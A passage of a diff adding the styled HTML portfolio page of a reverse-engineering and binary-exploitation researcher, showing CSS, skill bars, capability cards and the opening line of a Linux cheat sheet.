@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>j1gs4w // RE & BinExp</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=VT323&display=swap" rel="stylesheet">
+<style>
+:root{--green:#00ff41;--green-dim:#00c832;--green-dark:#003b00;--red:#ff003c;--amber:#ffb300;--cyan:#00eeff;--bg:#020a02;--bg2:#050f05;--border:#00ff4133;--text:#c8ffc8;--text-dim:#5a8c5a;--scanline:rgba(0,255,65,0.025);}
+*{margin:0;padding:0;box-sizing:border-box;}html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:'Share Tech Mono',monospace;font-size:14px;line-height:1.6;cursor:none;overflow-x:hidden;}
+#cursor{position:fixed;pointer-events:none;z-index:99999;transform:translate(-50%,-50%);width:20px;height:20px;}
+#cursor::before,#cursor::after{content:'';position:absolute;background:var(--green);opacity:0.5;}
+#cursor::before{width:1px;height:100%;left:50%;top:0;}
+#cursor::after{width:100%;height:1px;top:50%;left:0;}
+#cursor-dot{position:fixed;width:3px;height:3px;background:var(--green);border-radius:50%;pointer-events:none;z-index:99999;transform:translate(-50%,-50%);opacity:0.85;}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,var(--scanline) 2px,var(--scanline) 4px);pointer-events:none;z-index:9997;animation:scanroll 10s linear infinite;}
+@keyframes scanroll{0%{background-position:0 0}100%{background-position:0 200px}}
+body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,0.75)100%);pointer-events:none;z-index:9996;}
+nav{position:fixed;top:0;width:100%;z-index:1000;background:rgba(2,10,2,0.94);border-bottom:1px solid var(--border);backdrop-filter:blur(6px);display:flex;align-items:center;justify-content:space-between;padding:0 2rem;height:52px;}
+.nav-logo{font-family:'Orbitron',monospace;font-weight:900;font-size:1.1rem;color:var(--green);letter-spacing:2px;text-shadow:0 0 12px var(--green);}
+.nav-clock{font-size:0.7rem;color:var(--text-dim);letter-spacing:2px;border:1px solid var(--border);padding:0.2rem 0.8rem;background:rgba(0,255,65,0.03);}
+.blink{animation:blink 1s step-end infinite;}@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.nav-links{display:flex;gap:1.2rem;list-style:none;align-items:center;}
+.nav-links a{color:var(--text-dim);text-decoration:none;font-size:0.68rem;letter-spacing:2px;text-transform:uppercase;transition:color 0.2s,text-shadow 0.2s;}
+.nav-links a:hover{color:var(--green);text-shadow:0 0 8px var(--green);}
+#hero{min-height:100vh;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;padding:6rem 2rem 4rem;}
+#matrix-canvas{position:absolute;inset:0;opacity:0.18;pointer-events:none;}
+.hero-grid{position:absolute;inset:0;background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);background-size:40px 40px;animation:gridfade 4s ease-in-out infinite alternate;opacity:0.4;}
+@keyframes gridfade{from{opacity:0.2}to{opacity:0.6}}
+.hero-content{position:relative;z-index:2;text-align:center;max-width:800px;}
+.hero-tag{font-size:0.7rem;letter-spacing:5px;color:var(--green-dim);margin-bottom:1rem;display:block;}
+.hero-name{font-family:'VT323',monospace;font-size:clamp(5rem,15vw,10rem);color:var(--green);text-shadow:0 0 10px var(--green),0 0 30px var(--green),0 0 60px var(--green-dim),0 0 100px var(--green-dark);letter-spacing:8px;line-height:1;animation:glitch 5s infinite;position:relative;user-select:none;}
+@keyframes glitch{0%,92%,100%{transform:none;filter:none}93%{transform:skewX(-2deg) translateX(3px);filter:hue-rotate(90deg)}94%{transform:skewX(2deg) translateX(-3px)}95%{transform:none;filter:hue-rotate(180deg) brightness(2)}96%{transform:translateX(-4px);filter:none}97%{transform:translateX(4px)}98%{transform:none}}
+.hero-name::before,.hero-name::after{content:attr(data-text);position:absolute;inset:0;opacity:0;}
+.hero-name::before{color:var(--red);animation:glitch-r 5s infinite;clip-path:polygon(0 20%,100% 20%,100% 40%,0 40%);}
+.hero-name::after{color:#00eeff;animation:glitch-b 5s infinite;clip-path:polygon(0 60%,100% 60%,100% 80%,0 80%);}
+@keyframes glitch-r{0%,92%,100%{opacity:0;transform:none}93%{opacity:.8;transform:translateX(-4px)}95%{opacity:0}}
+@keyframes glitch-b{0%,93%,100%{opacity:0;transform:none}94%{opacity:.8;transform:translateX(4px)}96%{opacity:0}}
+.hero-subtitle{font-family:'Orbitron',monospace;font-size:0.7rem;letter-spacing:6px;color:var(--text-dim);margin-top:0.5rem;text-transform:uppercase;}
+.hero-desc{margin:2rem auto 0;color:var(--text-dim);font-size:0.85rem;max-width:500px;border-left:2px solid var(--green);padding-left:1rem;text-align:left;}
+.hero-badges{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;margin-top:2.5rem;}
+.badge{border:1px solid var(--border);padding:0.4rem 1rem;font-size:0.7rem;letter-spacing:2px;color:var(--green-dim);background:rgba(0,255,65,0.04);text-transform:uppercase;clip-path:polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%);cursor:default;transition:all 0.2s;}
+.badge:hover{background:rgba(0,255,65,0.12);color:var(--green);text-shadow:0 0 6px var(--green);border-color:var(--green);}
+.badge::before{content:'> ';color:var(--green);}
+.scroll-hint{position:absolute;bottom:2rem;left:50%;transform:translateX(-50%);font-size:0.65rem;letter-spacing:3px;color:var(--text-dim);animation:bounce 2s ease-in-out infinite;}
+@keyframes bounce{0%,100%{transform:translateX(-50%) translateY(0)}50%{transform:translateX(-50%) translateY(6px)}}
+section{padding:5rem 2rem;max-width:1100px;margin:0 auto;}
+.section-header{display:flex;align-items:center;gap:1rem;margin-bottom:3rem;}
+.section-num{font-family:'VT323',monospace;font-size:3rem;color:var(--green-dark);line-height:1;}
+.section-title{font-family:'Orbitron',monospace;font-size:1.2rem;font-weight:700;letter-spacing:4px;color:var(--green);text-transform:uppercase;text-shadow:0 0 10px var(--green-dim);}
+.section-line{flex:1;height:1px;background:linear-gradient(90deg,var(--border),transparent);}
+.skills-wrap{display:grid;gap:1rem;margin-bottom:2.5rem;}
+.skill-row{display:flex;align-items:center;gap:1rem;}
+.skill-label{font-size:0.72rem;letter-spacing:1px;color:var(--text-dim);min-width:180px;text-transform:uppercase;}
+.skill-bar-bg{flex:1;height:6px;background:var(--green-dark);overflow:hidden;}
+.skill-bar-fill{height:100%;background:linear-gradient(90deg,var(--green-dark),var(--green));width:0%;transition:width 1.4s cubic-bezier(0.4,0,0.2,1);box-shadow:0 0 8px var(--green);position:relative;}
+.skill-bar-fill::after{content:'';position:absolute;right:0;top:0;height:100%;width:4px;background:var(--green);animation:pulsebar 1s ease-in-out infinite alternate;}
+@keyframes pulsebar{from{box-shadow:0 0 4px var(--green)}to{box-shadow:0 0 16px var(--green)}}
+.skill-pct{font-size:0.65rem;color:var(--green);min-width:36px;text-align:right;}
+.spec-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1.5rem;}
+.spec-card{border:1px solid var(--border);padding:1.5rem;background:var(--bg2);position:relative;overflow:hidden;transition:border-color .3s,box-shadow .3s,transform .2s,opacity .5s;opacity:0;transform:translateY(24px);}
+.spec-card.visible{opacity:1;transform:translateY(0);}
+.spec-card::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:var(--green);transform:scaleY(0);transform-origin:top;transition:transform .3s;}
+.spec-card:hover{border-color:var(--green);box-shadow:0 0 25px rgba(0,255,65,.12);transform:translateY(-3px);}
+.spec-card:hover::before{transform:scaleY(1);}
+.spec-icon{font-size:1.5rem;margin-bottom:.8rem;display:block;}
+.spec-name{font-family:'Orbitron',monospace;font-size:.75rem;font-weight:700;letter-spacing:2px;color:var(--green);margin-bottom:.5rem;text-transform:uppercase;}
+.spec-desc{color:var(--text-dim);font-size:.8rem;line-height:1.7;}
+.spec-tags{display:flex;flex-wrap:wrap;gap:.4rem;margin-top:.8rem;}
+.spec-tag{font-size:.6rem;letter-spacing:1px;padding:.15rem .5rem;border:1px solid var(--green-dark);color:var(--green-dim);background:rgba(0,255,65,.03);cursor:default;transition:all .15s;}
+.spec-tag:hover{border-color:var(--green-dim);color:var(--green);}
+.terminal{background:#000;border:1px solid var(--border);overflow:hidden;}
+.terminal-bar{background:#0a1a0a;padding:.5rem 1rem;display:flex;align-items:center;gap:.5rem;border-bottom:1px solid var(--border);}
+.t-dot{width:10px;height:10px;border-radius:50%;}.t-dot.r{background:#ff5f57;}.t-dot.y{background:#febc2e;}.t-dot.g{background:#28c840;}
+.terminal-title{font-size:.7rem;color:var(--text-dim);letter-spacing:2px;margin-left:.5rem;flex:1;}
+.copy-hint{font-size:.6rem;color:var(--text-dim);opacity:.5;}
+.terminal-body{padding:1.5rem;font-size:.82rem;line-height:1.8;color:var(--green-dim);max-height:500px;overflow-y:auto;}
+.terminal-body::-webkit-scrollbar{width:4px;}.terminal-body::-webkit-scrollbar-thumb{background:var(--green-dark);}
+.t-prompt{color:var(--green);}.t-cmd{color:var(--text);}.t-comment{color:var(--text-dim);opacity:.6;}.t-output{color:#8fb;margin-left:1rem;}
+.t-section{color:var(--amber);font-family:'Orbitron',monospace;font-size:.65rem;letter-spacing:2px;margin:1.2rem 0 .4rem;text-transform:uppercase;}
+.t-var{color:#7dd;}.t-str{color:#e9c;}.highlight{color:var(--green);}.dim{color:var(--text-dim);}
+#live-term-body{padding:1.2rem;font-size:.82rem;line-height:1.8;color:var(--green-dim);min-height:260px;max-height:380px;overflow-y:auto;}
+.live-input-row{display:flex;align-items:center;gap:.5rem;padding:.5rem 1.2rem 1rem;border-top:1px solid var(--border);}
+.live-input-row span{color:var(--green);font-size:.82rem;white-space:nowrap;}
+#term-input{flex:1;background:transparent;border:none;outline:none;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:.82rem;caret-color:var(--green);}
+.cheat-cats,.ex-filter{display:flex;flex-wrap:wrap;gap:.5rem;margin-bottom:1.5rem;}
+.cat-btn,.ex-btn{background:transparent;border:1px solid var(--border);color:var(--text-dim);padding:.3rem .8rem;font-family:'Share Tech Mono',monospace;font-size:.7rem;letter-spacing:1px;cursor:pointer;transition:all .2s;}
+.cat-btn:hover,.cat-btn.active,.ex-btn:hover,.ex-btn.active{border-color:var(--green);color:var(--green);background:rgba(0,255,65,.05);}
+.copy-line{cursor:pointer;border-radius:2px;transition:background .15s;}
+.copy-line:hover{background:rgba(0,255,65,.07);}
+.copy-line:hover::after{content:' ⧉ copy';color:var(--green);opacity:.5;font-size:.65rem;}
+.copied-flash{background:rgba(0,255,65,.2)!important;}
+.encoder-wrap{border:1px solid var(--border);background:var(--bg2);padding:1.5rem;margin-top:2rem;}
+.encoder-title{font-family:'Orbitron',monospace;font-size:.72rem;letter-spacing:3px;color:var(--green);text-transform:uppercase;margin-bottom:1.2rem;}
+.enc-row{display:flex;gap:1rem;flex-wrap:wrap;margin-bottom:.8rem;align-items:center;}
+.enc-label{font-size:.65rem;letter-spacing:2px;color:var(--text-dim);min-width:56px;text-transform:uppercase;}
+.enc-input{flex:1;min-width:200px;background:#000;border:1px solid var(--border);color:var(--text);font-family:'Share Tech Mono',monospace;font-size:.78rem;padding:.5rem .8rem;outline:none;transition:border-color .2s;}
+.enc-input:focus{border-color:var(--green);}
+.enc-output-grid{display:grid;grid-template-columns:1fr 1fr;gap:.8rem;margin-top:.8rem;}
+.enc-out{background:#000;border:1px solid var(--green-dark);padding:.7rem .8rem;font-size:.72rem;cursor:pointer;transition:border-color .2s;}
+.enc-out:hover{border-color:var(--green-dim);}
+.enc-out-label{font-size:.6rem;letter-spacing:2px;color:var(--text-dim);margin-bottom:.3rem;text-transform:uppercase;}
+.enc-out-val{color:var(--green-dim);margin-top:.2rem;word-break:break-all;}
+/* EXAMPLES */
+.ex-grid{display:grid;gap:1.5rem;}
+.ex-card{border:1px solid var(--border);background:var(--bg2);overflow:hidden;transition:border-color .2s,box-shadow .2s;}
+.ex-card:hover{border-color:var(--green-dim);box-shadow:0 0 20px rgba(0,255,65,.06);}
+.ex-header{padding:1rem 1.5rem;display:flex;align-items:center;gap:1rem;cursor:pointer;user-select:none;border-bottom:1px solid var(--border);}
+.ex-type{font-size:.58rem;letter-spacing:1px;padding:.15rem .5rem;font-weight:700;text-transform:uppercase;flex-shrink:0;}
+.ex-type.stack{background:rgba(0,255,65,.1);color:var(--green);border:1px solid var(--green-dark);}
+.ex-type.heap{background:rgba(255,0,60,.1);color:var(--red);border:1px solid rgba(255,0,60,.25);}
+.ex-type.mem{background:rgba(255,179,0,.1);color:var(--amber);border:1px solid rgba(255,179,0,.25);}
+.ex-type.rop{background:rgba(0,238,255,.1);color:#00eeff;border:1px solid rgba(0,238,255,.25);}
+.ex-title{font-family:'Orbitron',monospace;font-size:.76rem;color:var(--text);letter-spacing:1px;flex:1;}
+.ex-lang{font-size:.62rem;color:var(--text-dim);flex-shrink:0;padding-right:.5rem;}
+.ex-toggle{color:var(--green);transition:transform .25s;flex-shrink:0;}
+.ex-body{max-height:0;overflow:hidden;transition:max-height .5s cubic-bezier(.4,0,.2,1);}
+.ex-body.open{max-height:4000px;}
+.ex-body-inner{padding:1.2rem 1.5rem;}
+.ex-desc{font-size:.8rem;color:var(--text-dim);line-height:1.8;margin-bottom:1rem;border-left:2px solid var(--green-dark);padding-left:.8rem;}
+.ex-tabs{display:flex;gap:0;border-bottom:1px solid var(--border);}
+.ex-tab{background:transparent;border:none;border-bottom:2px solid transparent;color:var(--text-dim);font-family:'Orbitron',monospace;font-size:.62rem;letter-spacing:2px;padding:.5rem 1rem;cursor:pointer;text-transform:uppercase;transition:all .2s;margin-bottom:-1px;}
+.ex-tab.active{color:var(--green);border-bottom-color:var(--green);}
+.ex-tab:hover:not(.active){color:var(--text);border-bottom-color:var(--border);}
+.ex-pane{display:none;margin-top:.8rem;}
+.ex-pane.active{display:block;}
+.poc-sev-inline{font-size:.58rem;letter-spacing:1px;padding:.1rem .45rem;font-weight:700;text-transform:uppercase;margin-bottom:.5rem;display:inline-block;}
+.poc-sev-inline.critical{background:var(--red);color:#000;}
+.poc-sev-inline.high{background:#ff6b00;color:#000;}
+.poc-sev-inline.medium{background:var(--amber);color:#000;}
+.poc-meta-inline{font-size:.65rem;color:var(--text-dim);margin-bottom:.6rem;}
+.poc-desc-inline{font-size:.8rem;color:var(--text-dim);line-height:1.8;margin-bottom:.8rem;border-left:2px solid var(--red);padding-left:.8rem;}
+.code-wrap{position:relative;}
+.code-block{background:#000;border:1px solid var(--green-dark);padding:1rem;font-size:.76rem;color:var(--green-dim);overflow-x:auto;white-space:pre;line-height:1.7;}
+.code-copy-btn{position:absolute;top:.5rem;right:.5rem;background:rgba(0,0,0,.85);border:1px solid var(--border);color:var(--text-dim);font-family:'Share Tech Mono',monospace;font-size:.58rem;padding:.18rem .45rem;cursor:pointer;letter-spacing:1px;transition:all .2s;text-transform:uppercase;z-index:2;}
+.code-copy-btn:hover{border-color:var(--green);color:var(--green);}
+.c-comment{color:#4a7a4a;}.c-kw{color:#7dd;}.c-fn{color:var(--green);}.c-bug{color:var(--red);font-weight:bold;}.c-str{color:#e9c;}.c-num{color:var(--amber);}
+/* PORTFOLIO */
+.file-list-wrap{background:var(--bg2);border:1px solid var(--border);}
+.file-list-header{padding:.7rem 1.2rem;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;}
+.file-list-title{font-family:'Orbitron',monospace;font-size:.65rem;letter-spacing:2px;color:var(--green);}
+.file-list-count{font-size:.62rem;color:var(--text-dim);}
+.file-list{list-style:none;max-height:420px;overflow-y:auto;padding:.4rem 0;}
+.file-list::-webkit-scrollbar{width:3px;}.file-list::-webkit-scrollbar-thumb{background:var(--green-dark);}
+.file-item{display:flex;align-items:center;gap:.8rem;padding:.55rem 1.2rem;border-bottom:1px solid rgba(0,255,65,.05);transition:background .15s;}
+.file-item:last-child{border-bottom:none;}.file-item:hover{background:rgba(0,255,65,.03);}
+.file-item-icon{font-size:.9rem;flex-shrink:0;opacity:.7;}
+.file-item-info{flex:1;min-width:0;}
+.file-item-name{font-size:.75rem;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.file-item-meta{font-size:.6rem;color:var(--text-dim);margin-top:.1rem;}
+.file-dl-btn{background:transparent;border:1px solid var(--border);color:var(--text-dim);font-family:'Share Tech Mono',monospace;font-size:.58rem;padding:.15rem .4rem;cursor:pointer;transition:all .15s;text-transform:uppercase;text-decoration:none;flex-shrink:0;white-space:nowrap;}
+.file-dl-btn:hover{border-color:var(--green);color:var(--green);}
+.file-empty{text-align:center;padding:2.5rem;color:var(--text-dim);font-size:.75rem;opacity:.5;}
+/* CONTACT */
+#contact{border-top:1px solid var(--border);}
+.contact-wrap{display:grid;grid-template-columns:1fr 1fr;gap:3rem;align-items:start;}
+.contact-info p{color:var(--text-dim);font-size:.82rem;margin-bottom:1.5rem;line-height:1.8;}
+.contact-email{font-family:'Orbitron',monospace;font-size:.75rem;color:var(--green);text-decoration:none;letter-spacing:1px;border:1px solid var(--border);padding:.8rem 1.2rem;display:inline-flex;align-items:center;gap:.5rem;transition:all .2s;}
+.contact-email:hover{border-color:var(--green);box-shadow:0 0 20px rgba(0,255,65,.2);background:rgba(0,255,65,.05);}
+.contact-form input,.contact-form textarea{width:100%;background:var(--bg2);border:1px solid var(--border);color:var(--text);font-family:'Share Tech Mono',monospace;font-size:.82rem;padding:.7rem 1rem;outline:none;margin-bottom:.8rem;resize:vertical;transition:border-color .2s;}
+.contact-form input:focus,.contact-form textarea:focus{border-color:var(--green);}
+.contact-form textarea{min-height:120px;}
+.contact-label{font-size:.65rem;letter-spacing:2px;color:var(--text-dim);display:block;margin-bottom:.3rem;text-transform:uppercase;}
+.contact-form .field{margin-bottom:.5rem;}
+/* CTF TEAM */
+.ctf-team-wrap{margin-top:3rem;border:1px solid var(--amber);background:linear-gradient(135deg,rgba(255,179,0,.04),rgba(0,255,65,.02));position:relative;overflow:hidden;}
+.ctf-team-wrap::before{content:'// CTF TEAM';position:absolute;top:.7rem;right:1rem;font-size:.6rem;letter-spacing:3px;color:var(--amber);opacity:.3;font-family:'Orbitron',monospace;}
+.ctf-team-wrap::after{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:var(--amber);box-shadow:0 0 10px var(--amber);}
+.ctf-team-inner{display:grid;grid-template-columns:1fr 1fr;gap:2.5rem;padding:2rem 2rem 2rem 2.5rem;}
+@media(max-width:700px){.ctf-team-inner{grid-template-columns:1fr;gap:1.5rem;}}
+.ctf-team-badge{display:flex;align-items:center;gap:1rem;margin-bottom:1rem;}
+.ctf-flag{font-size:2rem;color:var(--amber);text-shadow:0 0 12px var(--amber);line-height:1;}
+.ctf-team-name{font-family:'Orbitron',monospace;font-size:1rem;font-weight:700;color:var(--amber);letter-spacing:3px;}
+.ctf-team-sub{font-size:.65rem;letter-spacing:2px;color:var(--text-dim);margin-top:.2rem;}
+.ctf-team-desc{font-size:.8rem;color:var(--text-dim);line-height:1.8;margin-bottom:1rem;}
+.ctf-tags{display:flex;flex-wrap:wrap;gap:.4rem;}
+.ctf-tag{font-size:.6rem;letter-spacing:1px;padding:.15rem .5rem;border:1px solid rgba(255,179,0,.3);color:var(--amber);opacity:.8;transition:all .2s;}
+.ctf-tag:hover{opacity:1;border-color:var(--amber);}
+.ctf-how{margin-bottom:1.5rem;}
+.ctf-how-title{font-family:'Orbitron',monospace;font-size:.65rem;letter-spacing:3px;color:var(--amber);margin-bottom:.8rem;}
+.ctf-step{display:flex;gap:.8rem;align-items:flex-start;margin-bottom:.6rem;font-size:.78rem;color:var(--text-dim);line-height:1.6;}
+.ctf-step-num{color:var(--amber);font-family:'Orbitron',monospace;font-size:.65rem;min-width:22px;margin-top:.1rem;opacity:.7;}
+.ctf-email-btn{display:flex;align-items:center;gap:1rem;border:1px solid rgba(255,179,0,.4);padding:.8rem 1.2rem;text-decoration:none;color:var(--amber);font-family:'Share Tech Mono',monospace;font-size:.75rem;letter-spacing:1px;transition:all .2s;background:rgba(255,179,0,.03);}
+.ctf-email-btn:hover{border-color:var(--amber);box-shadow:0 0 16px rgba(255,179,0,.15);}
+.ctf-email-icon{font-size:1.1rem;opacity:.8;}
+footer{border-top:1px solid var(--border);padding:2rem;text-align:center;color:var(--text-dim);font-size:.7rem;letter-spacing:2px;}
+footer span{color:var(--green);}
+.konami-hint{margin-top:1.5rem;display:inline-flex;flex-direction:column;align-items:center;gap:.6rem;border:1px solid var(--border);padding:.8rem 1.5rem;background:rgba(0,255,65,.02);}
+.konami-label{font-family:'Orbitron',monospace;font-size:.55rem;letter-spacing:3px;color:var(--green-dim);opacity:.7;}
+.konami-keys{display:flex;gap:.3rem;align-items:center;flex-wrap:wrap;justify-content:center;}
+kbd{display:inline-block;border:1px solid var(--border);background:rgba(0,255,65,.06);color:var(--green-dim);font-family:'Share Tech Mono',monospace;font-size:.65rem;padding:.15rem .4rem;min-width:22px;text-align:center;line-height:1.4;}
+.konami-desc{font-size:.62rem;letter-spacing:1px;color:var(--text-dim);opacity:.6;}
+#root-overlay{display:none;position:fixed;inset:0;background:#000;z-index:99999;flex-direction:column;align-items:center;justify-content:center;font-family:'VT323',monospace;}
+#root-overlay.show{display:flex;}
+.root-text{color:var(--green);font-size:2.2rem;letter-spacing:4px;text-align:center;line-height:1.7;text-shadow:0 0 20px var(--green);white-space:pre;}
+.root-sub{color:var(--text-dim);font-size:1rem;margin-top:1rem;letter-spacing:3px;}
+.root-close{margin-top:3rem;border:1px solid var(--green);color:var(--green);background:transparent;font-family:'Share Tech Mono',monospace;font-size:.8rem;letter-spacing:2px;padding:.6rem 2rem;cursor:pointer;transition:all .2s;}
+.root-close:hover{background:var(--green);color:#000;}
+#toast{position:fixed;bottom:2rem;right:2rem;background:var(--green);color:#000;font-family:'Share Tech Mono',monospace;font-size:.75rem;letter-spacing:1px;padding:.6rem 1.2rem;z-index:9999;display:none;box-shadow:0 0 20px var(--green);}
+::-webkit-scrollbar{width:4px;}::-webkit-scrollbar-track{background:var(--bg);}::-webkit-scrollbar-thumb{background:var(--green-dark);}
+.divider{border:none;border-top:1px solid var(--border);margin:0;}
+@media(max-width:640px){.contact-wrap{grid-template-columns:1fr;}.nav-links{gap:.5rem;}.nav-links a{font-size:.56rem;}.nav-clock{display:none;}.enc-output-grid{grid-template-columns:1fr;}}
+</style>
+</head>
+<body>
+
+<div id="cursor"></div><div id="cursor-dot"></div>
+<div id="root-overlay">
+  <div class="root-text" id="root-text"></div>
+  <div class="root-sub">// KONAMI CODE ACCEPTED — ROOT SHELL SPAWNED</div>
+  <button class="root-close" onclick="document.getElementById('root-overlay').classList.remove('show')">EXIT SHELL</button>
+</div>
+<div id="toast"></div>
+
+<nav>
+  <div class="nav-logo">j1gs4w<span class="blink">_</span></div>
+  <div class="nav-clock" id="nav-clock">00:00:00</div>
+  <ul class="nav-links">
+    <li><a href="#about">About</a></li>
+    <li><a href="#specialties">Skills</a></li>
+    <li><a href="#cheatsheet">Cheatsheet</a></li>
+    <li><a href="#examples">Research</a></li>
+    <li><a href="#portfolio">Portfolio</a></li>
+    <li><a href="#contact">Contact</a></li>
+  </ul>
+</nav>
+
+<section id="hero">
+  <canvas id="matrix-canvas"></canvas>
+  <div class="hero-grid"></div>
+  <div class="hero-content">
+    <span class="hero-tag">// root@0xdead:~$ whoami</span>
+    <div class="hero-name" data-text="j1gs4w">j1gs4w</div>
+    <div class="hero-subtitle">Reverse Engineering &nbsp;·&nbsp; Binary Exploitation &nbsp;·&nbsp; Vulnerability Research</div>
+    <p class="hero-desc">Tearing apart binaries, breaking assumptions, and turning undefined behaviour into control flow. Specialising in low-level exploitation, RE, and vulnerability research.</p>
+    <div class="hero-badges">
+      <div class="badge">x86_64</div><div class="badge">ARM</div><div class="badge">ROP Chains</div>
+      <div class="badge">Heap Exploitation</div><div class="badge">Kernel Pwn</div>
+      <div class="badge">Fuzzing</div><div class="badge">IDA Pro</div><div class="badge">GDB/PWNDBG</div>
+    </div>
+  </div>
+  <div class="scroll-hint">▼ scroll ▼</div>
+</section>
+<hr class="divider">
+
+<!-- 01 ABOUT -->
+<section id="about">
+  <div class="section-header"><span class="section-num">01</span><span class="section-title">System Init</span><div class="section-line"></div></div>
+  <div class="skills-wrap" id="skill-bars">
+    <div class="skill-row"><span class="skill-label">Binary Exploitation</span><div class="skill-bar-bg"><div class="skill-bar-fill" data-pct="93"></div></div><span class="skill-pct">93%</span></div>
+    <div class="skill-row"><span class="skill-label">Reverse Engineering</span><div class="skill-bar-bg"><div class="skill-bar-fill" data-pct="91"></div></div><span class="skill-pct">91%</span></div>
+    <div class="skill-row"><span class="skill-label">Kernel Exploitation</span><div class="skill-bar-bg"><div class="skill-bar-fill" data-pct="78"></div></div><span class="skill-pct">78%</span></div>
+    <div class="skill-row"><span class="skill-label">Fuzzing / Vuln Research</span><div class="skill-bar-bg"><div class="skill-bar-fill" data-pct="85"></div></div><span class="skill-pct">85%</span></div>
+    <div class="skill-row"><span class="skill-label">Firmware Analysis</span><div class="skill-bar-bg"><div class="skill-bar-fill" data-pct="72"></div></div><span class="skill-pct">72%</span></div>
+  </div>
+  <div class="terminal">
+    <div class="terminal-bar"><div class="t-dot r"></div><div class="t-dot y"></div><div class="t-dot g"></div><span class="terminal-title">bash — j1gs4w@0xdead [interactive]</span><span class="copy-hint">type 'help'</span></div>
+    <div id="live-term-body"></div>
+    <div class="live-input-row"><span>j1gs4w@0xdead:~$&nbsp;</span><input id="term-input" autocomplete="off" spellcheck="false" placeholder="enter command..."></div>
+  </div>
+</section>
+<hr class="divider">
+
+<!-- 02 SPECIALTIES -->
+<section id="specialties">
+  <div class="section-header"><span class="section-num">02</span><span class="section-title">Capabilities</span><div class="section-line"></div></div>
+  <div class="spec-grid">
+    <div class="spec-card"><span class="spec-icon">🔬</span><div class="spec-name">Reverse Engineering</div><p class="spec-desc">Static and dynamic analysis of stripped binaries, obfuscated code, and proprietary protocols. Rebuilding logic from assembly up.</p><div class="spec-tags"><span class="spec-tag">IDA Pro</span><span class="spec-tag">Ghidra</span><span class="spec-tag">Binary Ninja</span><span class="spec-tag">Anti-debug</span><span class="spec-tag">Deobfuscation</span></div></div>
+    <div class="spec-card"><span class="spec-icon">💥</span><div class="spec-name">Binary Exploitation</div><p class="spec-desc">Turning memory safety bugs into code execution. Stack smashing, heap feng shui, format strings, and beyond.</p><div class="spec-tags"><span class="spec-tag">ROP</span><span class="spec-tag">Heap Exploitation</span><span class="spec-tag">Stack Overflow</span><span class="spec-tag">UAF</span><span class="spec-tag">Format String</span></div></div>
+    <div class="spec-card"><span class="spec-icon">⚙️</span><div class="spec-name">Vulnerability Research</div><p class="spec-desc">Finding 0-days through manual auditing, fuzzing, and taint analysis. From initial triage to full write-up.</p><div class="spec-tags"><span class="spec-tag">AFL++</span><span class="spec-tag">LibFuzzer</span><span class="spec-tag">Code Audit</span><span class="spec-tag">Taint Analysis</span><span class="spec-tag">CVE</span></div></div>
+    <div class="spec-card"><span class="spec-icon">🧠</span><div class="spec-name">Kernel Internals</div><p class="spec-desc">Linux kernel exploitation, driver vulnerabilities, privilege escalation primitives, and bypassing kernel mitigations.</p><div class="spec-tags"><span class="spec-tag">LPE</span><span class="spec-tag">SMEP/SMAP</span><span class="spec-tag">KASLR</span><span class="spec-tag">Rootkits</span><span class="spec-tag">eBPF</span></div></div>
+    <div class="spec-card"><span class="spec-icon">🔗</span><div class="spec-name">Exploit Development</div><p class="spec-desc">Reliable, weaponised exploit chains. ASLR/PIE bypass, NX bypass, RELRO bypass — full exploit primitives from scratch.</p><div class="spec-tags"><span class="spec-tag">pwntools</span><span class="spec-tag">ASLR Bypass</span><span class="spec-tag">NX Bypass</span><span class="spec-tag">RELRO</span><span class="spec-tag">One-gadget</span></div></div>
+    <div class="spec-card"><span class="spec-icon">🐞</span><div class="spec-name">Firmware Analysis</div><p class="spec-desc">Unpacking and reversing embedded device firmware, IoT targets, and custom architectures (MIPS, ARM, RISC-V).</p><div class="spec-tags"><span class="spec-tag">Binwalk</span><span class="spec-tag">QEMU</span><span class="spec-tag">JTAG</span><span class="spec-tag">MIPS</span><span class="spec-tag">ARM</span></div></div>
+  </div>
+</section>
+<hr class="divider">
+
+<!-- 03 CHEAT SHEET + ENCODER -->
+<section id="cheatsheet">
+  <div class="section-header"><span class="section-num">03</span><span class="section-title">Linux Cheat Sheet</span><div class="section-line"></div></div>
+  <div class="cheat-cats">
+    <button class="cat-btn active" onclick="showCat('all',this)">ALL</button>
+    <button class="cat-btn" onclick="showCat('recon',this)">RECON</button>
+    <button class="cat-btn" onclick="showCat('exploit',this)">EXPLOIT</button>
+    <button class="cat-btn" onclick="showCat('pivot',this)">PIVOT</button>
+    <button class="cat-btn" onclick="showCat('files',this)">FILES</button>
+    <button class="cat-btn" onclick="showCat('priv',this)">PRIVESC</button>
+    <button class="cat-btn" onclick="showCat('gdb',this)">GDB</button>
+    <button class="cat-btn" onclick="showCat('pwndbg',this)">PWNDBG</button>
+  </div>
+  <div class="terminal">
+    <div class="terminal-bar"><div class="t-dot r"></div><div class="t-dot y"></div><div class="t-dot g"></div><span class="terminal-title">cheatsheet.sh</span><span class="copy-hint">click any line to copy</span></div>
+    <div class="terminal-body" id="cheat-body">
+      <div class="cheat-block" data-cat="recon">
+        <div class="t-section"># ─── RECON &amp; ENUMERATION ───</div>
+        <div class="copy-line" data-copy="file ./binary"><span class="t-prompt">$</span> <span class="t-cmd">file</span> <span class="t-var">./binary</span><span class="t-comment">                  # identify binary type</span></div>
